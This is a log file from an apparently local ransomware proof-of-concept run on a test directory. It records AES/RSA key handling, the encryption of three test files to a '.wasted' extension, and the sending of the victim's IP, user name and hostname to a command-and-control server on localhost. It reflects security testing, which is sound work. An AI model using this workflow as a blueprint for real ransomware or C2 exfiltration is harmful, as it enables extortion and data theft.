2025-06-25 11:24:34,430 - INFO - ============================================================
2025-06-25 11:24:34,431 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
2025-06-25 11:24:34,431 - INFO - ============================================================
2025-06-25 11:24:34,431 - INFO - Log file: logs/ransomware_activity_20250625_112434.log
2025-06-25 11:24:34,432 - INFO - Timestamp: 2025-06-25 11:24:34
2025-06-25 11:24:34,543 - INFO - Platform: Windows 11
2025-06-25 11:24:34,544 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
2025-06-25 11:24:34,544 - INFO - User: mudit
2025-06-25 11:24:34,545 - INFO - Hostname: Mudityadev
2025-06-25 11:24:34,546 - INFO - ============================================================
2025-06-25 11:24:34,546 - INFO - Starting main function
2025-06-25 11:24:34,546 - INFO - Parsing command line arguments
2025-06-25 11:24:34,547 - INFO - Setting up argument parser
2025-06-25 11:24:34,548 - INFO - Parsing command line arguments
2025-06-25 11:24:34,549 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
2025-06-25 11:24:34,549 - INFO - Operation mode: ENCRYPT
2025-06-25 11:24:34,550 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:24:34,550 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:24:34,550 - INFO - Initializing RSA encryption for AES key
2025-06-25 11:24:34,625 - INFO - AES key encrypted with RSA public key
2025-06-25 11:24:34,625 - INFO - Encrypted key (base64): Ve6jHTEOc7vOF8Pvy2rmzPmvV2XiPLAPjYfL5bm+dH1xVafCyj+SIQ3Qtq/5vKVMqkKHvLx18qzxwHmOSvrkvJvXM14sfaOgy6gAuacxeFBLg0ji+EPGD+ScQmbuctZMIdciZ1Ke6XFZXMDRz0wv083P7760tOFLRXvgQzNM563uPlBMxAj8XV7CRnVaTKXS5T2HkLVx58CjXj/lO7v3yCnPNSuUHhiSFYwYmL8IH8Ulm1B1LIS4NCNn38LYzDHDujcn8QeGyUB7eOW19Qv5iypFNDCNQMu6Ow23h/vGqZQSLhgiQKok/5tkCyVTsI1XUUV9px2a/oGOmB5jnYBbRw==
2025-06-25 11:24:34,626 - INFO - Using hardcoded AES key for encryption
2025-06-25 11:24:34,626 - INFO - Creating AES cipher with CTR mode
2025-06-25 11:24:34,636 - INFO - Starting file discovery and processing
2025-06-25 11:24:34,637 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:24:34,639 - INFO - Discovered 3 files in D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:24:34,639 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt
2025-06-25 11:24:34,642 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt -> D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt.wasted
2025-06-25 11:24:34,643 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt
2025-06-25 11:24:34,647 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt -> D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt.wasted
2025-06-25 11:24:34,648 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt
2025-06-25 11:24:34,650 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt -> D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt.wasted
2025-06-25 11:24:34,651 - INFO - Total files processed: 3
2025-06-25 11:24:34,651 - INFO - Starting key exfiltration and GUI launch
2025-06-25 11:24:34,652 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 11:24:34,667 - INFO - Retrieving local IP address
2025-06-25 11:24:34,668 - INFO - Local IP address: 192.168.217.136
2025-06-25 11:24:34,670 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
2025-06-25 11:24:34,670 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:24:34,671 - INFO - Launching GUI window
2025-06-25 11:25:09,216 - INFO - Received keyboard interrupt, exiting
